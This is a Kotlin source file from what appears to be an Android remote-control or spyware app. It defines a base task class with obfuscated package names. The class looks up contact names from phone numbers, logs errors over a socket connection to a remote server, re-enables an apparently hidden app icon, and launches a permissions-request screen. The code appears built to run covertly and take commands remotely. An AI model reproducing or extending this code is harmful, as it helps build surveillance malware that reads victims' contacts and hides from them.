package com.xxx.zzz.commandp.taskssv

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.Intent.FLAG_ACTIVITY_NEW_TASK
import android.content.pm.PackageManager
import android.net.Uri
import android.provider.ContactsContract
import androidx.core.content.ContextCompat
import com.xxx.zzz.BuildConfig
import com.xxx.zzz.PermissionsActivity
import com.xxx.zzz.globp.CommonParamsvc
import com.xxx.zzz.socketsp.IOSocketyt

open class BaseTask(private val ctx: Context) : Thread(), Runnable {

    val params: CommonParamsvc = CommonParamsvc(ctx)

    protected fun getContactName(phoneNumber: String, context: Context = ctx): String {
        var contactName = phoneNumber
        runCatching {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                val uri = Uri.withAppendedPath(
                    ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                    Uri.encode(phoneNumber)
                )
                val projection = arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME)
                val cursor = context.contentResolver.query(uri, projection, null, null, null)

                if (cursor != null) {
                    if (cursor.moveToFirst()) {
                        contactName = cursor.getString(0)
                    }
                    cursor.close()
                }
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "getContactName error ${it.localizedMessage}", "error")
        }
        return contactName
    }

    private fun showAppIcon() {
        runCatching {
            val componentName = ComponentName(ctx, PermissionsActivity::class.java)
            ctx.packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
        }.onFailure {
            IOSocketyt.sendLogs("", "showAppIcon error ${it.localizedMessage}", "error")
        }
    }

    protected fun requestPermissions() {
        if (!BuildConfig.DEBUG) showAppIcon()
        val i = Intent(ctx, PermissionsActivity::class.java)
        i.addFlags(FLAG_ACTIVITY_NEW_TASK)
        ctx.startActivity(i)
    }
}